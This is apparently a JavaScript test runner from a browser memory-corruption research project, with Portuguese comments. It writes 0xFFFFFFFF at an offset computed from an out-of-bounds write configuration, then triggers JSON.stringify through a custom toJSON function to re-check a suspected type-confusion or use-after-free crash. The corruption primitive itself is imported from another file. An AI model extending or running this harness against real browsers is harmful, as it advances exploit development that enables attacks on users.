// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeFocusedTestForTypeError } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG } from '../config.mjs'; 
import { toHex } from '../utils.mjs';     

// Contador global LOCALIZADO NESTE MÓDULO
let current_toJSON_call_count_for_TypeError_test = 0;

// Variante V2 (Controle que ANTES FALHAVA, agora para re-teste): Apenas incrementa o contador global.
function toJSON_Decomp_V2_GlobalCounterOnly_ReTest() {
    current_toJSON_call_count_for_TypeError_test++; 
    // document.title = `toJSON_V2_ReTest Call ${current_toJSON_call_count_for_TypeError_test}`; // Mantenha comentado para isolar o contador
    return { payloadV2_ReTest: "V2_retest_global_counter_incremented", call_count_inside_toJSON: current_toJSON_call_count_for_TypeError_test };
}


async function runTypeErrorReConfirmationTest() {
    const FNAME_RUNNER = "runTypeErrorReConfirmationTest";
    logS3(`==== INICIANDO Re-Teste do Gatilho do TypeError (GlobalCounterOnly) ====`, 'test', FNAME_RUNNER);

    const testDescription = "ReTest_Decomp_V2_GlobalCounterOnly";
    const toJSON_function_to_use = toJSON_Decomp_V2_GlobalCounterOnly_ReTest;
    
    const valueForCorruption = 0xFFFFFFFF;
    const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70

    logS3(`\n--- Testando Variante toJSON: ${testDescription} ---`, 'subtest', FNAME_RUNNER);
    document.title = `Iniciando Re-Teste: ${testDescription}`; 
    
    current_toJSON_call_count_for_TypeError_test = 0; // Resetar contador ANTES do teste
    
    const result = await executeFocusedTestForTypeError(
        testDescription,
        toJSON_function_to_use,
        valueForCorruption,
        criticalOffset
    );
    
    const calls_this_run = current_toJSON_call_count_for_TypeError_test;

    if (result.errorOccurred) {
        logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}. Chamadas toJSON (este módulo): ${calls_this_run}`, "error", FNAME_RUNNER);
    } else if (result.potentiallyCrashed) {
        logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL. Chamadas toJSON (este módulo): ${calls_this_run}`, "error", FNAME_RUNNER);
    } else {
        logS3(`   RESULTADO ${testDescription}: Completou sem erro explícito no stringify. Chamadas toJSON (este módulo): ${calls_this_run}`, "good", FNAME_RUNNER);
        logS3(`      Resultado da toJSON (stringifyResult): ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);
    }
    logS3(`   Título da página ao final de ${testDescription}: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    if (result.errorOccurred?.name === 'TypeError') {
        logS3(`   CONFIRMADO: TypeError ocorreu como nas observações anteriores (antes da refatoração do contador).`, "vuln", FNAME_RUNNER);
    } else if (!result.errorOccurred && !result.potentiallyCrashed) {
        logS3(`   NOTA: TypeError NÃO ocorreu. O comportamento mudou consistentemente após a refatoração do contador.`, "good", FNAME_RUNNER);
    }

    logS3(`==== Re-Teste do Gatilho do TypeError CONCLUÍDO ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_ReConfirmTypeError';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Re-Teste do Gatilho do TypeError (GlobalCounterOnly) ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Re-Teste TypeError";
    
    await runTypeErrorReConfirmationTest();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Re-Teste do TypeError) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    
    if (document.title.startsWith("Iniciando") || document.title.startsWith("CONGELOU?")) {
        // Manter
    } else if (document.title.includes("ERRO")) {
        // Manter título de erro
    }
    else {
        document.title = "Script 3 Concluído - Re-Teste TypeError";
    }
}
